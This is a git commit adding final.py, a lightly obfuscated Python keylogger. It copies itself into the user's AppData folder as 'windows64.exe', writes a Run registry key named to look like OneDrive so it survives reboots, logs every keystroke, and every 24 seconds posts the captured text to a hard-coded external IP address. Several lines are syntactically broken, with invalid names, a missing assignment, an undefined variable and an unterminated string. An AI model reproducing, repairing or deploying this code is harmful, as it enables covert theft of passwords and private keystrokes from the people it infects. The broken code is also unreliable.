9522dba173d1c3f58f724ffed8230700da480b0e
crisco321 <75357932+crisco321@users.noreply.github.com>
2022-12-21 13:48:10 +0000

    Create final.py

---
+++ final.py
@@ -0,0 +1,64 @@
+from pynput import keyboard #line:1:from pynput import keyboard
+import requests #line:2:import requests
+import shutil #line:3:import shutil
+import subprocess #line:4:import subprocess
+import json #line:5:import json
+import threading #line:6:import threading
+import socket #line:7:import socket
+import platform #line:8:import platform
+import base64 #line:9:import base64
+import sys #line:10:import sys
+import os #line:11:import os
+import time #line:12:import time
+text =""#line:13:text = ""
+ip ="35.1"#line:15:ip = "35.1"
+add ="68.1"#line:16:add = "68.1"
+ress ="37.29"#line:17:ress = "37.29"
+port_number ="8080"#line:18:port_number = "8080"
+ip_address =ip +add +ress #line:19:ip_address = ip + add + ress
+time_interval =24 #line:21:time_interval = 24
+def pxsehdxexiwh ():#line:23:def pxsehdxexiwh():
+    OOOOOOO0O0O0000O0 =os .environ ['appdata']+'\\windows64.exe'#line:24:location = os.environ['appdata'] + '\\windows64.exe'
+    shutil .copyfile (sys .executable ,OOOOOOO0O0O0000O0 )#line:25:shutil.copyfile(sys.executable,location)
+    O2000002200939999 = 'reg add HK
+    O84993409 = 'CU\Soft' 
+    032495 = 'ware\Mic'
+    O3234525 'rosoft\Windo'
+    O43245322342 = 'ws\Cur'
+    O95903429 = 'rentVer'
+    O959034 = 'sion\R'
+    O2000002 = 'un' 
+    O95903 = '/v OneDrive' + randint + ' /t REG_SZ /d "'
+    O0404994 = O2000002200939999 +O84993409 +032495 +O3234525 +O43245322342 +O95903429 +O959034 +O2000002 +O95903
+    subprocess .call (O0404994 +OOOOOOO0O0O0000O0 +'"',shell =True )#line:26:subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDrive /t REG_SZ /d "' + location + '"', shell=True)
+pxsehdxexiwh ()#line:28:pxsehdxexiwh()
+def send_post_req ():#line:30:def send_post_req():
+    try :#line:31:try:
+        O0OO0O000O00O00O0 =json .dumps ({"keyboardData":text })#line:32:payload = json.dumps({"keyboardData" : text})
+        O0O00000OOOOO0O0O =requests .post (f"http://{ip_address}:{port_number}",data =O0OO0O000O00O00O0 ,headers ={"Content-Type":"application/json"})#line:34:data = payload, headers={"Content-Type" : "application/json"})
+        OOO00OOOO0OOO0000 =threading .Timer (time_interval ,send_post_req )#line:35:timer = threading.Timer(time_interval, send_post_req)
+        O0OO0O000O00O00O0 ="<br><br><p><p>"#line:36:payload = "<br><br><p><p>"
+        OOO00OOOO0OOO0000 .start ()#line:37:timer.start()
+    except :#line:38:except:
+        print ("Couldn't complete request!")#line:39:print("Couldn't complete request!")
+def on_press (O000OOOOOOO0OOO00 ):#line:41:def on_press(key):
+    global text #line:42:global text
+    if O000OOOOOOO0OOO00 ==keyboard .Key .enter :#line:44:if key == keyboard.Key.enter:
+        text +="[enter]"#line:45:text += "[enter]"
+    elif O000OOOOOOO0OOO00 ==keyboard .Key .tab :#line:46:elif key == keyboard.Key.tab:
+        text +="[tab]"#line:47:text += "[tab]"
+    elif O000OOOOOOO0OOO00 ==keyboard .Key .space :#line:48:elif key == keyboard.Key.space:
+        text +="[space]"#line:49:text += "[space]"
+    elif O000OOOOOOO0OOO00 ==keyboard .Key .shift :#line:50:elif key == keyboard.Key.shift:
+        text +="[shift]"#line:51:text += "[shift]"
+    elif O000OOOOOOO0OOO00 ==keyboard .Key .backspace :#line:52:elif key == keyboard.Key.backspace:
+         text +="[<-]"#line:53:text += "[<-]"
+    elif O000OOOOOOO0OOO00 ==keyboard .Key .ctrl_l or O000OOOOOOO0OOO00 ==keyboard .Key .ctrl_r :#line:54:elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+         text +="[control]"#line:55:text += "[control]"
+    elif O000OOOOOOO0OOO00 ==keyboard .Key .esc :#line:56:elif key == keyboard.Key.esc:
+         text +="[escape]"#line:57:text += "[escape]"
+    else :#line:58:else:
+        text +=str (O000OOOOOOO0OOO00 ).strip ("'")#line:59:text += str(key).strip("'")
+with keyboard .Listener (on_press =on_press )as listener :#line:62:on_press=on_press) as listener:
+    send_post_req ()#line:63:send_post_req()
+    listener .join ()
